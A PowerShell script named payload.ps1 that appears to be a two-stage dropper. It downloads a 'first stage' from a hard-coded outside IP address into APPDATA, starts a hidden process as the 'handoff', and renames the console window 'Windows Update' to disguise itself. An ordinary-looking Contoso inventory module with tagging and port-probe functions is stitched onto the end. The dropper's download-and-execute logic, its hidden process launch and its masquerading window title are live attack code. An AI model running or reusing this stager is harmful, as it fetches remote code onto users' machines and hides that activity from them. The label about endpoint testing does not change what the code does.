<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://198.51.100.85/stage1.ps1',
    [string]$DownloadPath = "$env:APPDATA\stage1.bin",
    [string]$TracePath = "$env:TEMP\transfer.log",
    [int]$TransferTimeout = 94
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 94
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = "",
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
    Write-Verbose "Second stage handoff complete"
    return $true
}

Write-Verbose "Starting multi-stage workflow"
$StageResult = Invoke-Stage1Download -SourceUrl $TargetUrl -DestinationPath $DownloadPath -TimeoutSec $TransferTimeout
if ($StageResult) {
    $HandoffResult = Invoke-Stage2Execution -StagedPath $DownloadPath
    Write-Verbose ("Handoff result: " + $HandoffResult)
}
else {
    Write-Warning "First stage did not complete"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $TargetUrl
    Destination = $DownloadPath
    TimeoutSec = $TransferTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Collecting host metadata"
Write-Verbose "Preparing working directory"
Write-Verbose "Inspecting process list"
Write-Verbose "Retry budget remaining"
Write-Verbose "Validating result"
Write-Verbose "Operation completed"
Write-Verbose "Checking local path"
Write-Verbose "Exporting operation report"
Write-Output "stage 19 initialized"
$Host.UI.RawUI.WindowTitle = "Windows Update"
$ErrorActionPreference = 'Stop'


$WarningPreference = 'Continue'
$culture = [System.Globalization.CultureInfo]::InvariantCulture
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$script:DefaultTimeout = 10
$script:ModuleVersion = '1.9.0'

function Get-ContosoEndpoint {
    <#
    .SYNOPSIS
        Returns Contoso inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Prod'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}
function Set-ContosoEndpointTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-ContosoEndpointHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-ContosoPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}

function Contoso-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-ContosoModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Contoso.Endpoint'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-ContosoEndpoint', 'Set-ContosoEndpointTag', 'Test-ContosoEndpointHealth')
    }
}

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

Write-Verbose ('Loaded module {0} version {1}' -f 'Contoso.Endpoint', $script:ModuleVersion)

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Contoso.Endpoint')

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

$script:ExportedFunctions = @('Get-ContosoEndpoint', 'Set-ContosoEndpointTag', 'Test-ContosoEndpointHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

Export-ModuleMember -Function Get-ContosoEndpoint, Set-ContosoEndpointTag, Test-ContosoEndpointHealth, Get-ContosoModuleInfo
